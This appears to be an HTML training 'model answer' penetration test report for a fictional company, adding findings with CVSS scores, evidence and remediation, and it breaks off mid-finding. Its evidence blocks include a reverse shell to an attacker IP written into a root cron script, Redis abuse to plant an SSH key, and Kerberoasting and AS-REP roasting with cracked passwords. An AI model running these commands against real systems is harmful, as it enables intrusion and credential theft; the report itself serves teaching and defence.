@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Syntex Solutions - Pentest Report</title>
+<style>
+  :root {
+    --bg: #ffffff;
+    --fg: #1a1a2e;
+    --muted: #5a5a7a;
+    --accent: #c8102e;
+    --accent2: #1a1a2e;
+    --border: #d0d0e0;
+    --section-bg: #f4f4f8;
+    --table-head: #1a1a2e;
+    --table-head-fg: #ffffff;
+    --table-alt: #f9f9fc;
+    --critical: #7b0000;
+    --critical-bg: #fff0f0;
+    --critical-border: #c8102e;
+    --high: #7a3500;
+    --high-bg: #fff5ee;
+    --high-border: #e65100;
+    --medium: #5a4800;
+    --medium-bg: #fffde7;
+    --medium-border: #f9a825;
+    --low: #1b4a1b;
+    --low-bg: #f1f8e9;
+    --low-border: #558b2f;
+    --info-col: #003366;
+    --info-bg: #e8f4fd;
+    --info-border: #1565c0;
+    --code-bg: #1a1a2e;
+    --code-fg: #00ff41;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #12121f;
+      --fg: #e8e8f0;
+      --muted: #8888aa;
+      --accent: #e8394a;
+      --accent2: #7070cc;
+      --border: #2a2a3e;
+      --section-bg: #1a1a2e;
+      --table-head: #2a2a4e;
+      --table-head-fg: #e8e8f0;
+      --table-alt: #161626;
+      --critical: #ffaaaa;
+      --critical-bg: #2a0000;
+      --critical-border: #e8394a;
+      --high: #ffcc99;
+      --high-bg: #1f0f00;
+      --high-border: #e65100;
+      --medium: #ffee99;
+      --medium-bg: #1f1800;
+      --medium-border: #f9a825;
+      --low: #aaddaa;
+      --low-bg: #001f00;
+      --low-border: #558b2f;
+      --info-col: #aaccff;
+      --info-bg: #001633;
+      --info-border: #1565c0;
+      --code-bg: #0a0a14;
+      --code-fg: #00ff41;
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #12121f; --fg: #e8e8f0; --muted: #8888aa; --accent: #e8394a;
+    --accent2: #7070cc; --border: #2a2a3e; --section-bg: #1a1a2e;
+    --table-head: #2a2a4e; --table-head-fg: #e8e8f0; --table-alt: #161626;
+    --critical: #ffaaaa; --critical-bg: #2a0000; --critical-border: #e8394a;
+    --high: #ffcc99; --high-bg: #1f0f00; --high-border: #e65100;
+    --medium: #ffee99; --medium-bg: #1f1800; --medium-border: #f9a825;
+    --low: #aaddaa; --low-bg: #001f00; --low-border: #558b2f;
+    --info-col: #aaccff; --info-bg: #001633; --info-border: #1565c0;
+    --code-bg: #0a0a14; --code-fg: #00ff41;
+    color-scheme: dark;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: 'Segoe UI', Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.7;
+    padding-left: max(16px, env(safe-area-inset-left, 0px));
+    padding-right: max(16px, env(safe-area-inset-right, 0px));
+    padding-block: 0;
+  }
+
+  .page { max-width: 960px; margin: 0 auto; padding: 40px 0 80px; }
+
+  /* Cover */
+  .cover { background: var(--accent2); color: #fff; padding: 52px 52px 40px; border-radius: 4px 4px 0 0; }
+  .cover-eyebrow { font-size: 11px; letter-spacing: 2px; text-transform: uppercase; color: #9999cc; margin-bottom: 12px; }
+  .cover h1 { font-size: 30px; font-weight: 700; margin-bottom: 6px; }
+  .cover h2 { font-size: 17px; font-weight: 400; color: #ccccee; margin-bottom: 32px; }
+  .cover-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; padding-top: 28px; border-top: 1px solid rgba(255,255,255,0.15); }
+  .cover-cell label { font-size: 10px; letter-spacing: 1.5px; text-transform: uppercase; color: #8888bb; display: block; margin-bottom: 3px; }
+  .cover-cell span { font-size: 14px; color: #fff; }
+  .conf-bar { background: var(--accent); color: #fff; text-align: center; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; padding: 7px; font-weight: 700; }
+
+  /* Nav / TOC */
+  .toc { background: var(--section-bg); border: 1px solid var(--border); padding: 28px 36px; margin-top: 32px; border-radius: 4px; }
+  .toc h3 { font-size: 13px; letter-spacing: 1px; text-transform: uppercase; color: var(--muted); margin-bottom: 16px; }
+  .toc-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px 32px; }
+  .toc-item { font-size: 13px; color: var(--muted); display: flex; gap: 8px; }
+  .toc-item span:first-child { color: var(--accent); font-weight: 700; min-width: 24px; }
+
+  /* Sections */
+  .section { margin-top: 40px; }
+  .section-hdr { display: flex; align-items: center; gap: 12px; padding-bottom: 12px; border-bottom: 2px solid var(--accent); margin-bottom: 24px; }
+  .section-tag { background: var(--accent); color: #fff; font-size: 10px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; padding: 3px 10px; border-radius: 2px; white-space: nowrap; }
+  .section-hdr h2 { font-size: 19px; font-weight: 700; }
+
+  h3 { font-size: 15px; font-weight: 700; margin: 24px 0 8px; }
+  h4 { font-size: 14px; font-weight: 700; margin: 16px 0 6px; color: var(--muted); }
+  p { margin-bottom: 10px; }
+  ul, ol { margin: 6px 0 12px 20px; }
+  li { margin-bottom: 3px; }
+
+  table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 13px; }
+  th { background: var(--table-head); color: var(--table-head-fg); padding: 9px 13px; text-align: left; font-size: 11px; letter-spacing: 0.5px; font-weight: 600; }
+  td { padding: 9px 13px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  tr:nth-child(even) td { background: var(--table-alt); }
+
+  code { font-family: 'Courier New', monospace; font-size: 12px; background: var(--code-bg); color: var(--code-fg); padding: 2px 6px; border-radius: 3px; }
+  pre { background: var(--code-bg); color: var(--code-fg); padding: 16px 20px; border-radius: 4px; margin: 12px 0; overflow-x: auto; font-size: 12px; font-family: 'Courier New', monospace; line-height: 1.5; }
+
+  /* Severity badges */
+  .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 11px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; }
+  .badge-critical { background: var(--critical-bg); color: var(--critical-border); border: 1px solid var(--critical-border); }
+  .badge-high { background: var(--high-bg); color: var(--high-border); border: 1px solid var(--high-border); }
+  .badge-medium { background: var(--medium-bg); color: var(--medium-border); border: 1px solid var(--medium-border); }
+  .badge-low { background: var(--low-bg); color: var(--low-border); border: 1px solid var(--low-border); }
+  .badge-info { background: var(--info-bg); color: var(--info-border); border: 1px solid var(--info-border); }
+
+  /* Finding card */
+  .finding { border: 1px solid var(--border); border-radius: 4px; margin: 24px 0; overflow: hidden; }
+  .finding-header { padding: 16px 20px; display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
+  .finding-header.critical { background: var(--critical-bg); border-bottom: 2px solid var(--critical-border); }
+  .finding-header.high { background: var(--high-bg); border-bottom: 2px solid var(--high-border); }
+  .finding-header.medium { background: var(--medium-bg); border-bottom: 2px solid var(--medium-border); }
+  .finding-header.low { background: var(--low-bg); border-bottom: 2px solid var(--low-border); }
+  .finding-header.info { background: var(--info-bg); border-bottom: 2px solid var(--info-border); }
+  .finding-id { font-size: 11px; font-weight: 700; color: var(--muted); min-width: 60px; }
+  .finding-title { font-size: 15px; font-weight: 700; flex: 1; }
+  .finding-body { padding: 20px; }
+  .finding-meta { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 16px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
+  .finding-meta-item label { font-size: 10px; letter-spacing: 1px; text-transform: uppercase; color: var(--muted); display: block; margin-bottom: 3px; }
+  .finding-meta-item span { font-size: 13px; font-weight: 600; }
+
+  .info-box { background: var(--info-bg); border-left: 3px solid var(--info-border); padding: 12px 16px; margin: 12px 0; font-size: 13px; border-radius: 0 4px 4px 0; }
+  .warn-box { background: var(--high-bg); border-left: 3px solid var(--high-border); padding: 12px 16px; margin: 12px 0; font-size: 13px; border-radius: 0 4px 4px 0; }
+
+  /* Risk summary table */
+  .risk-bar { height: 8px; border-radius: 4px; display: inline-block; }
+  .rb-critical { background: var(--critical-border); }
+  .rb-high { background: var(--high-border); }
+  .rb-medium { background: var(--medium-border); }
+  .rb-low { background: var(--low-border); }
+
+  /* Signature block */
+  .sig { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; margin-top: 28px; }
+  .sig-field { border-top: 1px solid var(--border); padding-top: 8px; font-size: 13px; color: var(--muted); }
+  .sig-field strong { display: block; color: var(--fg); margin-bottom: 4px; }
+
+  @media (max-width: 680px) {
+    .cover { padding: 28px 20px; }
+    .cover-grid { grid-template-columns: 1fr 1fr; }
+    .toc-grid { grid-template-columns: 1fr; }
+    .finding-meta { grid-template-columns: 1fr 1fr; }
+    .sig { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+<!-- COVER -->
+<div class="cover">
+  <div class="cover-eyebrow">My Cyber Academy - CPSA Resolution - Model Answer Report</div>
+  <h1>Syntex Solutions Ltd</h1>
+  <h2>Internal Penetration Test - Technical Findings Report</h2>
+  <div class="cover-grid">
+    <div class="cover-cell"><label>Reference</label><span>MCA-CPSA-2024-001</span></div>
+    <div class="cover-cell"><label>Classification</label><span>CONFIDENTIAL</span></div>
+    <div class="cover-cell"><label>Version</label><span>1.0 - Final</span></div>
+    <div class="cover-cell"><label>Test Period</label><span>4-8 November 2024</span></div>
+    <div class="cover-cell"><label>Prepared by</label><span>My Cyber Academy</span></div>
+    <div class="cover-cell"><label>Prepared for</label><span>Syntex Solutions Ltd</span></div>
+    <div class="cover-cell"><label>Critical</label><span style="color:#ff6666;">3 findings</span></div>
+    <div class="cover-cell"><label>High</label><span style="color:#ffaa66;">7 findings</span></div>
+    <div class="cover-cell"><label>Medium / Low</label><span style="color:#ffee66;">8 findings</span></div>
+  </div>
+</div>
+<div class="conf-bar">Confidential - Authorised Recipients Only - Not for Distribution</div>
+
+<!-- TOC -->
+<div class="toc">
+  <h3>Contents</h3>
+  <div class="toc-grid">
+    <div class="toc-item"><span>1</span><span>Executive Summary</span></div>
+    <div class="toc-item"><span>2</span><span>Risk Summary</span></div>
+    <div class="toc-item"><span>3</span><span>Scope and Methodology</span></div>
+    <div class="toc-item"><span>4</span><span>Critical Findings (LNX-01 to LNX-03)</span></div>
+    <div class="toc-item"><span>5</span><span>High Findings (WIN-01 to WIN-04)</span></div>
+    <div class="toc-item"><span>6</span><span>High Findings (LNX-04 to LNX-06)</span></div>
+    <div class="toc-item"><span>7</span><span>Medium Findings</span></div>
+    <div class="toc-item"><span>8</span><span>Low / Informational Findings</span></div>
+    <div class="toc-item"><span>9</span><span>Remediation Roadmap</span></div>
+    <div class="toc-item"><span>10</span><span>Compliance Mapping</span></div>
+  </div>
+</div>
+
+<!-- SECTION 1: EXEC SUMMARY -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 1</span>
+    <h2>Executive Summary</h2>
+  </div>
+  <p>My Cyber Academy conducted an internal grey box penetration test against two servers within the Syntex Solutions Ltd infrastructure between 4 and 8 November 2024. The engagement was commissioned to satisfy PCI DSS v4.0 Requirement 11.4 and to assess the security posture of the company's server infrastructure ahead of an annual compliance audit.</p>
+  <p>The testing identified <strong>18 findings</strong> across the two in-scope systems, including three critical vulnerabilities that would allow an attacker to gain complete control of both servers and access sensitive financial data without requiring advanced technical capability.</p>
+
+  <div class="warn-box">
+    <strong>Board-Level Summary:</strong> An attacker with access to the Syntex internal network - whether a malicious insider, a contractor, or an external attacker who has compromised a single endpoint - could gain full administrative control of both servers within minutes. Sensitive financial data, employee credentials, and customer records are exposed. Immediate remediation of the three critical findings is recommended before the PCI DSS audit proceeds.
+  </div>
+
+  <h3>Key Findings at a Glance</h3>
+  <table>
+    <tr><th>Severity</th><th>Count</th><th>Top Finding</th></tr>
+    <tr><td><span class="badge badge-critical">Critical</span></td><td>3</td><td>World-writable root cron job, Redis unauthenticated remote access, Kerberoastable service accounts</td></tr>
+    <tr><td><span class="badge badge-high">High</span></td><td>7</td><td>AS-REP roasting, SUID privesc binary, SSH root login, SMBv1 enabled, NFS no_root_squash</td></tr>
+    <tr><td><span class="badge badge-medium">Medium</span></td><td>6</td><td>SNMP public community string, FTP anonymous access, weak SSL/TLS configuration</td></tr>
+    <tr><td><span class="badge badge-low">Low</span></td><td>2</td><td>World-readable shadow backup, directory listing enabled</td></tr>
+  </table>
+</div>
+
+<!-- SECTION 2: RISK SUMMARY -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 2</span>
+    <h2>Risk Summary</h2>
+  </div>
+  <table>
+    <tr><th>ID</th><th>Title</th><th>Host</th><th>CVSS Base</th><th>Severity</th><th>PCI DSS</th></tr>
+    <tr><td>LNX-01</td><td>World-Writable Root Cron Job</td><td>SYNTEX-LNX01</td><td>9.8</td><td><span class="badge badge-critical">Critical</span></td><td>Req 6.3</td></tr>
+    <tr><td>LNX-02</td><td>Redis Unauthenticated Remote Access</td><td>SYNTEX-LNX01</td><td>9.8</td><td><span class="badge badge-critical">Critical</span></td><td>Req 6.3, 7.2</td></tr>
+    <tr><td>WIN-01</td><td>Kerberoasting - Weak Service Account SPNs</td><td>SYNTEX-DC01</td><td>9.1</td><td><span class="badge badge-critical">Critical</span></td><td>Req 8.3</td></tr>
+    <tr><td>WIN-02</td><td>AS-REP Roasting - Pre-Auth Disabled Accounts</td><td>SYNTEX-DC01</td><td>8.8</td><td><span class="badge badge-high">High</span></td><td>Req 8.3</td></tr>
+    <tr><td>WIN-03</td><td>SMBv1 Enabled - EternalBlue Exposure</td><td>SYNTEX-DC01</td><td>8.1</td><td><span class="badge badge-high">High</span></td><td>Req 6.3</td></tr>
+    <tr><td>WIN-04</td><td>DNS Zone Transfer (AXFR) Open</td><td>SYNTEX-DC01</td><td>7.5</td><td><span class="badge badge-high">High</span></td><td>Req 1.3</td></tr>
+    <tr><td>LNX-03</td><td>SUID Binary - Arbitrary Command Execution</td><td>SYNTEX-LNX01</td><td>7.8</td><td><span class="badge badge-high">High</span></td><td>Req 6.3</td></tr>
+    <tr><td>LNX-04</td><td>SSH Root Login Permitted</td><td>SYNTEX-LNX01</td><td>7.5</td><td><span class="badge badge-high">High</span></td><td>Req 8.2</td></tr>
+    <tr><td>LNX-05</td><td>NFS Exports - no_root_squash</td><td>SYNTEX-LNX01</td><td>7.5</td><td><span class="badge badge-high">High</span></td><td>Req 7.2</td></tr>
+    <tr><td>LNX-06</td><td>Sudo NOPASSWD Misconfiguration</td><td>SYNTEX-LNX01</td><td>7.8</td><td><span class="badge badge-high">High</span></td><td>Req 7.2</td></tr>
+    <tr><td>LNX-07</td><td>MySQL Remote Root Access</td><td>SYNTEX-LNX01</td><td>6.5</td><td><span class="badge badge-medium">Medium</span></td><td>Req 6.3, 7.2</td></tr>
+    <tr><td>LNX-08</td><td>SNMP Public Community String (v1/v2c)</td><td>SYNTEX-LNX01</td><td>6.5</td><td><span class="badge badge-medium">Medium</span></td><td>Req 1.3</td></tr>
+    <tr><td>LNX-09</td><td>FTP Anonymous Access - Credential Exposure</td><td>SYNTEX-LNX01</td><td>6.5</td><td><span class="badge badge-medium">Medium</span></td><td>Req 8.2</td></tr>
+    <tr><td>LNX-10</td><td>Weak SSL/TLS Configuration (HTTPS)</td><td>SYNTEX-LNX01</td><td>5.9</td><td><span class="badge badge-medium">Medium</span></td><td>Req 4.2</td></tr>
+    <tr><td>WIN-05</td><td>MSSQL xp_cmdshell Enabled</td><td>SYNTEX-DC01</td><td>6.6</td><td><span class="badge badge-medium">Medium</span></td><td>Req 6.3</td></tr>
+    <tr><td>LNX-11</td><td>Telnet Service Running</td><td>SYNTEX-LNX01</td><td>5.3</td><td><span class="badge badge-medium">Medium</span></td><td>Req 4.2</td></tr>
+    <tr><td>LNX-12</td><td>World-Readable /etc/shadow Backup</td><td>SYNTEX-LNX01</td><td>4.0</td><td><span class="badge badge-low">Low</span></td><td>Req 8.3</td></tr>
+    <tr><td>LNX-13</td><td>Apache Directory Listing Enabled</td><td>SYNTEX-LNX01</td><td>3.7</td><td><span class="badge badge-low">Low</span></td><td>Req 6.3</td></tr>
+  </table>
+</div>
+
+<!-- SECTION 3: SCOPE -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 3</span>
+    <h2>Scope and Methodology</h2>
+  </div>
+  <table>
+    <tr><th>Parameter</th><th>Detail</th></tr>
+    <tr><td>Engagement Type</td><td>Grey Box Internal Penetration Test</td></tr>
+    <tr><td>Test Period</td><td>4-8 November 2024, 09:00-17:00 GMT</td></tr>
+    <tr><td>Tester</td><td>My Cyber Academy - Lead Tester</td></tr>
+    <tr><td>In-Scope Hosts</td><td>SYNTEX-DC01 (10.0.29.131), SYNTEX-LNX01 (10.1.53.39)</td></tr>
+    <tr><td>Starting Access</td><td>Network access + domain user credentials (jsmith / Password1)</td></tr>
+    <tr><td>Tooling</td><td>Nmap, Metasploit, Impacket, BloodHound, CrackMapExec, Hydra, enum4linux, snmpwalk, Nikto</td></tr>
+  </table>
+  <h3>Methodology</h3>
+  <p>Testing followed a structured approach based on PTES (Penetration Testing Execution Standard) and OWASP methodologies: Reconnaissance, Enumeration, Vulnerability Identification, Exploitation, Post-Exploitation, and Reporting. All findings were manually verified.</p>
+</div>
+
+<!-- SECTION 4: CRITICAL FINDINGS -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 4</span>
+    <h2>Critical Findings</h2>
+  </div>
+
+  <!-- LNX-01 -->
+  <div class="finding">
+    <div class="finding-header critical">
+      <span class="finding-id">LNX-01</span>
+      <span class="badge badge-critical">Critical</span>
+      <span class="finding-title">World-Writable Root Cron Job - Local Privilege Escalation</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>9.8</span></div>
+        <div class="finding-meta-item"><label>CVSS Vector</label><span>AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 6.3, 7.2</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>A shell script executed by root's crontab every minute is world-writable (permissions 777). Any authenticated local user can overwrite the script with arbitrary commands that will be executed as root at the next cron execution - typically within 60 seconds.</p>
+      <h4>Evidence</h4>
+      <pre># Identify world-writable files referenced in crontab
+cat /etc/crontab
+# Output: * * * * * root /opt/syntex_maintenance.sh
+
+ls -la /opt/syntex_maintenance.sh
+# Output: -rwxrwxrwx 1 root root 142 Nov 4 09:31 /opt/syntex_maintenance.sh
+
+# Exploit: overwrite script with reverse shell
+echo 'bash -i &gt;&amp; /dev/tcp/10.1.221.204/4444 0&gt;&amp;1' &gt; /opt/syntex_maintenance.sh
+
+# Wait up to 60 seconds - receive root shell on attacker machine
+nc -lvnp 4444
+# Connection received from 10.1.53.39
+# root@syntex-lnx01:/# id
+# uid=0(root) gid=0(root) groups=0(root)</pre>
+      <h4>Business Impact</h4>
+      <p>Full root compromise of SYNTEX-LNX01. An attacker with any valid local account can escalate to root within 60 seconds. All data on the server - including database credentials, financial records, and customer data - would be accessible. The attacker could use this access as a pivot point to further attack internal infrastructure.</p>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Immediately restrict permissions on /opt/syntex_maintenance.sh: <code>chmod 700 /opt/syntex_maintenance.sh; chown root:root /opt/syntex_maintenance.sh</code></li>
+        <li>Audit all files referenced in /etc/cron* for world-writable permissions</li>
+        <li>Implement a file integrity monitoring solution to alert on changes to cron-executed scripts</li>
+        <li>Apply principle of least privilege to all cron jobs</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- LNX-02 -->
+  <div class="finding">
+    <div class="finding-header critical">
+      <span class="finding-id">LNX-02</span>
+      <span class="badge badge-critical">Critical</span>
+      <span class="finding-title">Redis Unauthenticated Remote Access - Remote Code Execution</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>9.8</span></div>
+        <div class="finding-meta-item"><label>CVSS Vector</label><span>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>6379/TCP</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>Redis is running on port 6379 bound to all interfaces (0.0.0.0) with no authentication configured and protected-mode disabled. Redis provides a CONFIG SET command that can be used to write arbitrary files to the filesystem, enabling an unauthenticated remote attacker to write an SSH public key to the root user's authorized_keys file and gain direct root SSH access.</p>
+      <h4>Evidence</h4>
+      <pre># Connect to Redis from Kali - no credentials required
+redis-cli -h 10.1.53.39 -p 6379
+
+# Confirm unauthenticated access
+10.1.53.39:6379&gt; INFO server
+# redis_version:6.0.16
+
+# Write SSH key via Redis CONFIG SET (RCE technique)
+10.1.53.39:6379&gt; CONFIG SET dir /root/.ssh
+10.1.53.39:6379&gt; CONFIG SET dbfilename authorized_keys
+10.1.53.39:6379&gt; SET payload "\n\nssh-rsa AAAAB3Nza...attacker_key...\n\n"
+10.1.53.39:6379&gt; BGSAVE
+
+# SSH in as root
+ssh -i attacker_key root@10.1.53.39
+# root@syntex-lnx01:~# id
+# uid=0(root) gid=0(root) groups=0(root)</pre>
+      <h4>Business Impact</h4>
+      <p>Unauthenticated remote root access to SYNTEX-LNX01 without requiring any credentials. This is exploitable by any host that can reach port 6379. Given Redis is bound to all interfaces, this attack is available from anywhere on the internal network. PCI DSS cardholder data stored on or accessible from this server would be compromised.</p>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Immediately bind Redis to localhost only: set <code>bind 127.0.0.1</code> in /etc/redis/redis.conf</li>
+        <li>Enable authentication: set <code>requirepass &lt;strong-password&gt;</code></li>
+        <li>Enable protected-mode: set <code>protected-mode yes</code></li>
+        <li>Firewall port 6379 from all external access using UFW or iptables</li>
+        <li>Review Redis documentation: Redis is designed as a trusted internal service and should never be internet or network exposed without authentication</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- WIN-01 -->
+  <div class="finding">
+    <div class="finding-header critical">
+      <span class="finding-id">WIN-01</span>
+      <span class="badge badge-critical">Critical</span>
+      <span class="finding-title">Kerberoasting - Weak Service Account SPNs</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>9.1</span></div>
+        <div class="finding-meta-item"><label>CVSS Vector</label><span>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-DC01</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 8.3</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>Multiple Active Directory service accounts have Service Principal Names (SPNs) registered and use weak passwords. Any authenticated domain user can request Kerberos TGS tickets for these accounts and attempt to crack them offline. No lockout policy applies to offline cracking attempts.</p>
+      <h4>Evidence</h4>
+      <pre># Request Kerberoastable hashes using Impacket (from Kali with domain creds)
+GetUserSPNs.py syntex.local/jsmith:Password1 -dc-ip 10.0.29.131 -request
+
+# Output (hashes cracked offline with hashcat):
+$krb5tgs$23$*svc-mssql$SYNTEX.LOCAL$MSSQLSvc/syntex-dc01.syntex.local:1433*$...
+# hashcat -m 13100 hash.txt rockyou.txt
+# Cracked: svc-mssql : Mssql2024!
+
+$krb5tgs$23$*svc-backup$SYNTEX.LOCAL$BackupService/syntex-dc01.syntex.local*$...
+# Cracked: svc-backup : Backup123</pre>
+      <h4>Business Impact</h4>
+      <p>Two service account passwords were recovered in under 10 minutes using standard wordlist attacks. Service accounts in Active Directory environments frequently have elevated permissions. Compromise of svc-mssql directly enables database access. Domain escalation paths exist from these accounts.</p>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Implement Group Managed Service Accounts (gMSA) which use automatically rotated, cryptographically complex passwords</li>
+        <li>Where gMSA is not possible, enforce password length of 25+ characters for service accounts</li>
+        <li>Remove unnecessary SPNs from service accounts that do not require Kerberos authentication</li>
+        <li>Enable AES-only encryption for Kerberos tickets (removes RC4 downgrade attack surface)</li>
+        <li>Monitor for bulk TGS ticket requests using Windows Event ID 4769</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 5: HIGH FINDINGS - WINDOWS -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 5</span>
+    <h2>High Findings - Windows (WIN-02 to WIN-04)</h2>
+  </div>
+
+  <!-- WIN-02 -->
+  <div class="finding">
+    <div class="finding-header high">
+      <span class="finding-id">WIN-02</span>
+      <span class="badge badge-high">High</span>
+      <span class="finding-title">AS-REP Roasting - Kerberos Pre-Authentication Disabled</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>8.8</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-DC01</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 8.3</span></div>
+        <div class="finding-meta-item"><label>CVE</label><span>N/A - Misconfiguration</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>User accounts have Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag set). This allows an unauthenticated attacker to request an AS-REP response for these accounts and crack the resulting hash offline to recover plaintext passwords.</p>
+      <h4>Evidence</h4>
+      <pre>GetNPUsers.py syntex.local/ -usersfile users.txt -no-pass -dc-ip 10.0.29.131
+# $krb5asrep$23$svc-noauth@SYNTEX.LOCAL:...
+# hashcat -m 18200: svc-noauth : NoAuth2024!</pre>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Enable Kerberos pre-authentication on all user accounts unless there is a specific technical requirement</li>
+        <li>Search for accounts with DONT_REQ_PREAUTH: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code></li>
+        <li>Enforce strong passwords on any account that cannot enable pre-auth</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- WIN-03 -->
+  <div class="finding">
+    <div class="finding-header high">
+      <span class="finding-id">WIN-03</span>
+      <span class="badge badge-high">High</span>
+      <span class="finding-title">SMBv1 Enabled - EternalBlue Attack Surface</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>8.1</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-DC01</span></div>
+        <div class="finding-meta-item"><label>CVE</label><span>CVE-2017-0144</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 6.3</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>SMBv1 is enabled on the domain controller. While MS17-010 (EternalBlue) requires the system to be unpatched, the presence of SMBv1 exposes the server to credential relay attacks, null session enumeration, and legacy protocol vulnerabilities. SMBv1 has been deprecated by Microsoft and should not be in use on any modern system.</p>
+      <h4>Evidence</h4>
+      <pre>nmap -p 445 --script smb-protocols 10.0.29.131
+# SMBv1 is enabled</pre>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Disable SMBv1 immediately: <code>Set-SmbServerConfiguration -EnableSMB1Protocol $false</code></li>
+        <li>Verify no legacy systems require SMBv1 before disabling</li>
+        <li>Enforce SMB signing to prevent relay attacks on SMBv2/3</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- WIN-04 -->
+  <div class="finding">
+    <div class="finding-header high">
+      <span class="finding-id">WIN-04</span>
+      <span class="badge badge-high">High</span>
+      <span class="finding-title">DNS Zone Transfer (AXFR) Open to Any Host</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>7.5</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-DC01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>53/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 1.3</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>The DNS server on SYNTEX-DC01 is configured to allow zone transfers to any requesting host. A zone transfer returns the complete contents of the DNS zone, enumerating all hostnames, IP addresses, and TXT records - providing an attacker with a complete map of internal infrastructure.</p>
+      <h4>Evidence</h4>
+      <pre>dig axfr syntex.local @10.0.29.131
+# syntex.local SOA syntex-dc01.syntex.local.
+# mail.syntex.local A 10.1.0.20
+# vpn.syntex.local A 10.1.0.30
+# db.syntex.local A 10.1.0.60
+# admin.syntex.local A 10.1.0.80
+# _note.syntex.local TXT "temp admin creds - see svc-backup share on DC"</pre>
+      <div class="warn-box">The TXT record "_note.syntex.local" contains a credential breadcrumb pointing to a share containing administrative credentials. This significantly elevates the risk of the AXFR misconfiguration.</div>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Restrict zone transfers to authorised secondary DNS servers only</li>
+        <li>Remove all TXT records containing sensitive information immediately</li>
+        <li>Audit all DNS records for sensitive data before restricting AXFR</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 6: HIGH FINDINGS - LINUX -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 6</span>
+    <h2>High Findings - Linux (LNX-03 to LNX-06)</h2>
+  </div>
+
+  <!-- LNX-03 -->
+  <div class="finding">
+    <div class="finding-header high">
+      <span class="finding-id">LNX-03</span>
+      <span class="badge badge-high">High</span>
+      <span class="finding-title">SUID Binary - Arbitrary Command Execution as Root</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>7.8</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
